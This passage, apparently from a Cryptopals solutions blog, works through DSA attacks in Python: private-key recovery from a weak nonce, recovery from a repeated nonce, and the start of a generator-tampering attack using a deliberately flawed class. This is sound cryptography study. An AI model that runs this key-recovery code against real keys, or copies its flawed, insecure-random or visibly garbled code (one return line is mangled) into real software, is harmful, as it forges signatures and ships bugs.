<p><a href="https://cryptopals.com/sets/6/challenges/43">Link</a></p>
<blockquote>
<p>DSA key recovery from nonce<br>
<strong>Step 1</strong>: Relocate so that you are out of easy travel distance of us. <strong>Step 2</strong>: Implement DSA, up to signing and verifying, including parameter generation.<br>
Hah-hah you&rsquo;re too far away to come punch us.<br>
Just kidding you can skip the parameter generation part if you want; if you do, use these params:<br>
<strong>p = 800000000000000089e1855218a0e7dac38136ffafa72eda7</strong><br>
<strong>859f2171e25e65eac698c1702578b07dc2a1076da241c76c6</strong><br>
<strong>2d374d8389ea5aeffd3226a0530cc565f3bf6b50929139ebe</strong><br>
<strong>ac04f48c3c84afb796d61e5a4f9a8fda812ab59494232c7d2</strong><br>
<strong>b4deb50aa18ee9e132bfa85ac4374d7f9091abc3d015efc87</strong><br>
<strong>1a584471bb1</strong><br>
<strong>q = f4f47f05794b256174bba6e9b396a7707e563c5b</strong><br>
<strong>g = 5958c9d3898b224b12672c0b98e06c60df923cb8bc999d119</strong><br>
<strong>458fef538b8fa4046c8db53039db620c094c9fa077ef389b5</strong><br>
<strong>322a559946a71903f990f1f7e0e025e2d7f7cf494aff1a047</strong><br>
<strong>0f5b64c36b625a097f1651fe775323556fe00b3608c887892</strong><br>
<strong>878480e99041be601a62166ca6894bdd41a7054ec89f756ba</strong><br>
<strong>9fc95302291</strong><br>
(&ldquo;But I want smaller params!&rdquo; Then generate them yourself.)<br>
The DSA signing operation generates a random subkey &ldquo;k&rdquo;. You know this because you implemented the DSA sign operation.<br>
This is the first and easier of two challenges regarding the DSA &ldquo;k&rdquo; subkey.<br>
Given a known &ldquo;k&rdquo;, it&rsquo;s trivial to recover the DSA private key &ldquo;x&rdquo;:<br>
<strong>x = ((s * k) - H(msg)) / r mod q</strong><br>
Do this a couple times to prove to yourself that you grok it. Capture it in a function of some sort.<br>
Now then. I used the parameters above. I generated a keypair. My pubkey is:<br>
<strong>y = 84ad4719d044495496a3201c8ff484feb45b962e7302e56a392aee4</strong><br>
<strong>abab3e4bdebf2955b4736012f21a08084056b19bcd7fee56048e004</strong><br>
<strong>e44984e2f411788efdc837a0d2e5abb7b555039fd243ac01f0fb2ed</strong><br>
<strong>1dec568280ce678e931868d23eb095fde9d3779191b8c0299d6e07b</strong><br>
<strong>bb283e6633451e535c45513b2d33c99ea17</strong><br>
I signed<br>
For those that envy a MC it can be hazardous to your health<br>
So be friendly, a matter of life and death, just like a etch-a-sketch<br>
(My SHA1 for this string was d2d0714f014a9784047eaeccf956520045c45265; I don&rsquo;t know what NIST wants you to do, but when I convert that hash to an integer I get: 0xd2d0714f014a9784047eaeccf956520045c45265).<br>
I get:<br>
<strong>r = 548099063082341131477253921760299949438196259240</strong><br>
<strong>s = 857042759984254168557880549501802188789837994940</strong><br>
I signed this string with a broken implemention of DSA that generated &ldquo;k&rdquo; values between 0 and 2^16. What&rsquo;s my private key?<br>
Its SHA-1 fingerprint (after being converted to hex) is:<br>
<strong>0954edd5e0afe5542a4adf012611a91912a3ec16</strong><br>
Obviously, it also generates the same signature for that string.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> getPrime
</code></pre></div><p>Define a class that implements the <a href="https://en.wikipedia.org/wiki/Digital_Signature_Algorithm">DSA</a> algorithm.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DSA</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implements the DSA public key encryption / decryption.
</span><span style="color:#e6db74">    Steps followed are from Wikipedia.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    DEFAULT_P <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;800000000000000089e1855218a0e7dac38136ffafa72eda7859f2171e25e65eac698c1702578b07dc2a1076da241c76&#34;</span>
                    <span style="color:#e6db74">&#34;c62d374d8389ea5aeffd3226a0530cc565f3bf6b50929139ebeac04f48c3c84afb796d61e5a4f9a8fda812ab59494232&#34;</span>
                    <span style="color:#e6db74">&#34;c7d2b4deb50aa18ee9e132bfa85ac4374d7f9091abc3d015efc871a584471bb1&#34;</span>, <span style="color:#ae81ff">16</span>)
    DEFAULT_Q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf4f47f05794b256174bba6e9b396a7707e563c5b</span>
    DEFAULT_G <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;5958c9d3898b224b12672c0b98e06c60df923cb8bc999d119458fef538b8fa4046c8db53039db620c094c9fa077ef389&#34;</span>
                    <span style="color:#e6db74">&#34;b5322a559946a71903f990f1f7e0e025e2d7f7cf494aff1a0470f5b64c36b625a097f1651fe775323556fe00b3608c88&#34;</span>
                    <span style="color:#e6db74">&#34;7892878480e99041be601a62166ca6894bdd41a7054ec89f756ba9fc95302291&#34;</span>, <span style="color:#ae81ff">16</span>)
        
    <span style="color:#66d9ef">def</span> __init__(self: object, p <span style="color:#f92672">=</span> DEFAULT_P, q <span style="color:#f92672">=</span> DEFAULT_Q, g <span style="color:#f92672">=</span> DEFAULT_G):
        self<span style="color:#f92672">.</span>p <span style="color:#f92672">=</span> p
        self<span style="color:#f92672">.</span>q <span style="color:#f92672">=</span> q
        self<span style="color:#f92672">.</span>g <span style="color:#f92672">=</span> g
        self<span style="color:#f92672">.</span>x, self<span style="color:#f92672">.</span> y <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_per_user_key()
        self<span style="color:#f92672">.</span>pvt, self<span style="color:#f92672">.</span>pub <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>x, self<span style="color:#f92672">.</span>y
        
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_per_user_key</span>(self: object):
        x <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, self<span style="color:#f92672">.</span>q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
        y <span style="color:#f92672">=</span> pow(self<span style="color:#f92672">.</span>g, x, self<span style="color:#f92672">.</span>p)
        <span style="color:#66d9ef">return</span> x, y
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">H</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
        <span style="color:#66d9ef">return</span> int(hashlib<span style="color:#f92672">.</span>sha1(message)<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">key_distribution</span>(self: object) <span style="color:#f92672">-&gt;</span> tuple:
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>pub
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_signature</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> (int, int):
        
        <span style="color:#66d9ef">while</span> True:
            k <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, self<span style="color:#f92672">.</span>q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
            r <span style="color:#f92672">=</span> pow(self<span style="color:#f92672">.</span>g, k, self<span style="color:#f92672">.</span>p) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
            <span style="color:#66d9ef">if</span> r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                <span style="color:#66d9ef">continue</span>
                
            s <span style="color:#f92672">=</span> (mod_inverse(k, self<span style="color:#f92672">.</span>q) <span style="color:#f92672">*</span> (self<span style="color:#f92672">.</span>H(message) <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>x <span style="color:#f92672">*</span> r)) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
            <span style="color:#66d9ef">if</span> s <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">return</span> (r, s)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_signature</span>(self: object, r: int, s: int, message: bytes) <span style="color:#f92672">-&gt;</span> bool:
        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> r <span style="color:#f92672">&gt;</span> self<span style="color:#f92672">.</span>q:
            <span style="color:#66d9ef">return</span> False
        <span style="color:#66d9ef">if</span> s <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> s <span style="color:#f92672">&gt;</span> self<span style="color:#f92672">.</span>q:
            <span style="color:#66d9ef">return</span> False
        
        w <span style="color:#f92672">=</span> mod_inverse(s, self<span style="color:#f92672">.</span>q)
        u1 <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>H(message) <span style="color:#f92672">*</span> w) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
        u2 <span style="color:#f92672">=</span> (r <span style="color:#f92672">*</span> w) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
        
        v1 <span style="color:#f92672">=</span> pow(self<span style="color:#f92672">.</span>g, u1, self<span style="color:#f92672">.</span>p)
        v2 <span style="color:#f92672">=</span> pow(self<span style="color:#f92672">.</span>y, u2, self<span style="color:#f92672">.</span>p)
        
        v <span style="color:#f92672">=</span> ((v1 <span style="color:#f92672">*</span> v2) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>p) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
        <span style="color:#66d9ef">return</span> v <span style="color:#f92672">==</span> r
</code></pre></div><p>Function to generate DSA parameters as described in the algorithm.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DSA_parameter_generation</span>(key_length: int) <span style="color:#f92672">-&gt;</span> (int, int, int):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Generates DSA parameters as described by the pseudo code on wikipedia.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#75715e"># Filter object is created, iter is used to fetch values and then tuple is accessed</span>
    modulo_list <span style="color:#f92672">=</span> [(<span style="color:#ae81ff">1024</span>, <span style="color:#ae81ff">160</span>), (<span style="color:#ae81ff">2048</span>, <span style="color:#ae81ff">224</span>), (<span style="color:#ae81ff">2048</span>, <span style="color:#ae81ff">256</span>), (<span style="color:#ae81ff">3072</span>, <span style="color:#ae81ff">256</span>)]    

    N <span style="color:#f92672">=</span> filter(<span style="color:#66d9ef">lambda</span> x:key_length <span style="color:#f92672">in</span> x, modulo_list)<span style="color:#f92672">.</span>__next__()[<span style="color:#ae81ff">1</span>]
    q <span style="color:#f92672">=</span> getPrime(N)
    
    p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">while</span> True:
        p <span style="color:#f92672">=</span> getPrime(key_length)
        <span style="color:#66d9ef">if</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> q <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">break</span>

    g <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    h <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    
    <span style="color:#66d9ef">while</span> True:
        h <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">2</span>, p <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>)
        g <span style="color:#f92672">=</span> h<span style="color:#f92672">**</span>((p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> q)
        <span style="color:#66d9ef">if</span> g <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
            <span style="color:#66d9ef">break</span>
    
    <span style="color:#66d9ef">return</span> p, q, gDSA_x_from_k

<span style="color:#75715e"># Takes a lot of time</span>
<span style="color:#75715e"># p, q, g = DSA_parameter_generation(1024)</span>
<span style="color:#75715e"># dsa = DSA(p, q, g)</span>
</code></pre></div><p>Test if the DSA implementation works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dsa <span style="color:#f92672">=</span> DSA()
signature <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>generate_signature(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello World!&#34;</span>)
<span style="color:#66d9ef">assert</span> dsa<span style="color:#f92672">.</span>verify_signature(signature[<span style="color:#ae81ff">0</span>], signature[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello World!&#34;</span>)
</code></pre></div><p>Looking at the equation used during signature(r, s) generation:</p>
<p><em>s = (mod_inverse(k, self.q) * (self.H(message) + self.x * r)) % self.q</em></p>
<p>It can be rearranged for all the known variables to be on the right, and the unknown (private key x) to be on the left.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DSA_x_from_k</span>(k: int, q: int, r: int, s: int, message_int: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns the value of x as calculated using other parameters.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> (((s <span style="color:#f92672">*</span> k) <span style="color:#f92672">-</span> message_int) <span style="color:#f92672">*</span> mod_inverse(r, q)) <span style="color:#f92672">%</span> q
</code></pre></div><p>Brute forcing all possible values of <em>k</em> uptil 256, since the question says:</p>
<blockquote>
<p>implemention of DSA that generated &ldquo;k&rdquo; values between 0 and 2^16.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">key_recovery_from_nonce</span>(q: int, r: int, s: int, y: int, message_int: int):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Verify if the key recovered from nonce is the same as given in question.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Given</span>
    target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0954edd5e0afe5542a4adf012611a91912a3ec16&#34;</span>
    
    <span style="color:#75715e"># This loop goes over all possibilities.</span>
    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">16</span>):
        x <span style="color:#f92672">=</span> DSA_x_from_k(k, q, r, s, message_int)
        
        <span style="color:#75715e"># [2:] tp skip the 0x</span>
        <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha1(hex(x)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> target:
            <span style="color:#66d9ef">return</span> x
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;For those that envy a MC it can be hazardous to your health</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">So be friendly, a matter of life and death, just like a etch-a-sketch</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
<span style="color:#75715e"># Used to verify if our implementation works correctly</span>
q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf4f47f05794b256174bba6e9b396a7707e563c5b</span>
r <span style="color:#f92672">=</span> <span style="color:#ae81ff">548099063082341131477253921760299949438196259240</span>
s <span style="color:#f92672">=</span> <span style="color:#ae81ff">857042759984254168557880549501802188789837994940</span>
y <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;84ad4719d044495496a3201c8ff484feb45b962e7302e56a392aee4abab3e4bdebf2955b4736012f21a0808&#34;</span>
        <span style="color:#e6db74">&#34;4056b19bcd7fee56048e004e44984e2f411788efdc837a0d2e5abb7b555039fd243ac01f0fb2ed1dec56828&#34;</span>
        <span style="color:#e6db74">&#34;0ce678e931868d23eb095fde9d3779191b8c0299d6e07bbb283e6633451e535c45513b2d33c99ea17&#34;</span>, <span style="color:#ae81ff">16</span>)
q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf4f47f05794b256174bba6e9b396a7707e563c5b</span>
r <span style="color:#f92672">=</span> <span style="color:#ae81ff">548099063082341131477253921760299949438196259240</span>
s <span style="color:#f92672">=</span> <span style="color:#ae81ff">857042759984254168557880549501802188789837994940</span>
y <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;84ad4719d044495496a3201c8ff484feb45b962e7302e56a392aee4abab3e4bdebf2955b4736012f21a0808&#34;</span>
        <span style="color:#e6db74">&#34;4056b19bcd7fee56048e004e44984e2f411788efdc837a0d2e5abb7b555039fd243ac01f0fb2ed1dec56828&#34;</span>
        <span style="color:#e6db74">&#34;0ce678e931868d23eb095fde9d3779191b8c0299d6e07bbb283e6633451e535c45513b2d33c99ea17&#34;</span>, <span style="color:#ae81ff">16</span>)

key <span style="color:#f92672">=</span> key_recovery_from_nonce(q, r, s, y, dsa<span style="color:#f92672">.</span>H(message<span style="color:#f92672">.</span>encode()))
<span style="color:#66d9ef">if</span> key <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Brute force successful.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Private key:&#34;</span>, key)
    test(True)
<span style="color:#66d9ef">else</span>:
    test(False)
</code></pre></div><p><code>&gt; Brute force successful.</code></p>
<p><code>Private key: 125489817134406768603130881762531825565433175625</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-44-dsa-nonce-recovery-from-repeated-nonce">Challenge 44: DSA nonce recovery from repeated nonce</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/44">Link</a></p>
<blockquote>
<p><a href="https://cryptopals.com/static/challenge-data/44.txt">In this file find a collection of DSA-signed messages.</a> (NB: each msg has a trailing space.)<br>
These were signed under the following pubkey:<br>
<strong>y = 2d026f4bf30195ede3a088da85e398ef869611d0f68f07 13d51c9c1a3a26c95105d915e2d8cdf26d056b86b8a7b8 5519b1c23cc3ecdc6062650462e3063bd179c2a6581519 f674a61f1d89a1fff27171ebc1b93d4dc57bceb7ae2430 f98a6a4d83d8279ee65d71c1203d2c96d65ebbf7cce9d3 2971c3de5084cce04a2e147821</strong><br>
(using the same domain parameters as the previous exercise)<br>
It should not be hard to find the messages for which we have accidentally used a repeated &ldquo;k&rdquo;. Given a pair of such messages, you can discover the &ldquo;k&rdquo; we used with the following formula:<br>
<strong>k = (m1 - m2) / (s1 - s2) mod q</strong><br>
What&rsquo;s my private key? Its SHA-1 (from hex) is:<br>
<strong>ca8f6f7c66fa362d40760d135b763eb8527d3d52</strong></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> hashlib
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;44.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>read()
q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf4f47f05794b256174bba6e9b396a7707e563c5b</span>
y <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;2d026f4bf30195ede3a088da85e398ef869611d0f68f0713d51c9c1a3a26c95105d915e2d8cdf26d056b86b8a7b8&#34;</span>
    <span style="color:#e6db74">&#34;5519b1c23cc3ecdc6062650462e3063bd179c2a6581519f674a61f1d89a1fff27171ebc1b93d4dc57bceb7ae2430f98a&#34;</span>
    <span style="color:#e6db74">&#34;6a4d83d8279ee65d71c1203d2c96d65ebbf7cce9d32971c3de5084cce04a2e147821&#34;</span>, <span style="color:#ae81ff">16</span>)

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ca8f6f7c66fa362d40760d135b763eb8527d3d52&#34;</span>
</code></pre></div><p>Find two pairs of signatures that used the same k.<br>
This is easy to find, because when the same k is used r will be the same, since r depends only on (g, p, q and k), and (g, p, q) are fixed in our implementation.</p>
<p>Calculate the value k with the given equation and then follow the previous question.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nonce_recovery_from_repeated_nonce</span>(message_dicts: dict, q: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Finds the signature pair using the same value for k from the given strings.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#75715e"># Find indices of signatures with matching r.</span>
    found <span style="color:#f92672">=</span> False
    r1, s1, s2, m1, m2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(message_dicts)):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(message_dicts[i:])):
            <span style="color:#66d9ef">if</span> message_dicts[i][<span style="color:#e6db74">&#34;r&#34;</span>] <span style="color:#f92672">==</span> message_dicts[j][<span style="color:#e6db74">&#34;r&#34;</span>]:
                m1 <span style="color:#f92672">=</span> message_dicts[i][<span style="color:#e6db74">&#34;m&#34;</span>]
                m2 <span style="color:#f92672">=</span> message_dicts[j][<span style="color:#e6db74">&#34;m&#34;</span>]
                <span style="color:#66d9ef">if</span> m1 <span style="color:#f92672">==</span> m2:
                    <span style="color:#66d9ef">continue</span>
                found <span style="color:#f92672">=</span> True
                r1 <span style="color:#f92672">=</span> message_dicts[i][<span style="color:#e6db74">&#34;r&#34;</span>]
                s1 <span style="color:#f92672">=</span> message_dicts[i][<span style="color:#e6db74">&#34;s&#34;</span>]
                s2 <span style="color:#f92672">=</span> message_dicts[j][<span style="color:#e6db74">&#34;s&#34;</span>]                
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">if</span> found:
            <span style="color:#66d9ef">break</span>
    <span style="color:#75715e"># Calculate the value of k once matching r has been found.</span>
    k <span style="color:#f92672">=</span> (((m1 <span style="color:#f92672">-</span> m2) <span style="color:#f92672">%</span> q) <span style="color:#f92672">*</span> mod_inverse((s1 <span style="color:#f92672">-</span> s2) <span style="color:#f92672">%</span> q, q)) <span style="color:#f92672">%</span> q
    <span style="color:#66d9ef">return</span> DSA_x_from_k(k, q, r1, s1, m1)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data_list <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
message_dicts <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data_list)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>):
    message_dicts<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;msg&#34;</span>:data_list[i][<span style="color:#ae81ff">5</span>:], <span style="color:#e6db74">&#34;s&#34;</span>:int(data_list[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:]), <span style="color:#e6db74">&#34;r&#34;</span>:int(data_list[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">3</span>:]), <span style="color:#e6db74">&#34;m&#34;</span>:int(data_list[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">3</span>:], <span style="color:#ae81ff">16</span>)})

recovered_x <span style="color:#f92672">=</span> nonce_recovery_from_repeated_nonce(message_dicts, q)
hashlib<span style="color:#f92672">.</span>sha1(hex(recovered_x)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-45-dsa-parameter-tampering">Challenge 45: DSA parameter tampering</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/45">Link</a></p>
<blockquote>
<p>Take your DSA code from the previous exercise. Imagine it as part of an algorithm in which the client was allowed to propose domain parameters (the p and q moduli, and the g generator).<br>
This would be bad, because attackers could trick victims into accepting bad parameters. Vaudenay gave two examples of bad generator parameters: generators that were 0 mod p, and generators that were 1 mod p.<br>
Use the parameters from the previous exercise, but substitute 0 for &ldquo;g&rdquo;. Generate a signature. You will notice something bad. Verify the signature. Now verify any other signature, for any other string.<br>
Now, try (p+1) as &ldquo;g&rdquo;. With this &ldquo;g&rdquo;, you can generate a magic signature s, r for any DSA public key that will validate against any string. For arbitrary z:<br>
<strong>r = ((y**z) % p) % q</strong><br>
<strong>s = r / z &mdash; % q</strong><br>
Sign &ldquo;Hello, world&rdquo;. And &ldquo;Goodbye, world&rdquo;.</p>
</blockquote>
<p>The DSA implementation from previous question, but with an introduced vulnerability.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DSA_flawed</span>(DSA):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Extends the DSA public key encryption / decryption.
</span><span style="color:#e6db74">    Allows r = 0, hence flawed.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_signature</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> (int, int):
        <span style="color:#66d9ef">while</span> True:
            k <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, self<span style="color:#f92672">.</span>q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
            r <span style="color:#f92672">=</span> pow(self<span style="color:#f92672">.</span>g, k, self<span style="color:#f92672">.</span>p) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q                
            s <span style="color:#f92672">=</span> (mod_inverse(k, self<span style="color:#f92672">.</span>q) <span style="color:#f92672">*</span> (self<span style="color:#f92672">.</span>H(message) <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>x <span style="color:#f92672">*</span> r)) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>q
            <span style="color:#66d9ef">if</span> s <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">return</span> (r, s)
</code></pre></div><p>Test if the DSA flawed implementation works.</p>
<p>The idea here is that <em>g = 0</em></p>
<p>    ⇨ r = 0 since <code>r = pow(self.g, k, self.p) % self.q</code></p>
<p>    ⇨ s = 0 since <code>s = (mod_inverse(k, self.q) * (self.H(message) + self.x * r)) % self.q</code></p>
<p>Therefore, the signature will always be valid for any message (refer the <code>verify_signature</code> method of the DSA class and follow the math to verify).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dsa <span style="color:#f92672">=</span> DSA_flawed(g <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>)
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Original message&#34;</span>

signature <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>generate_signature(message<span style="color:#f92672">.</span>encode())
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Message:&#34;</span>, message)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature generated for g = 0.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">r:&#34;</span>, signature[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">s:&#34;</span>, signature[<span style="color:#ae81ff">1</span>])
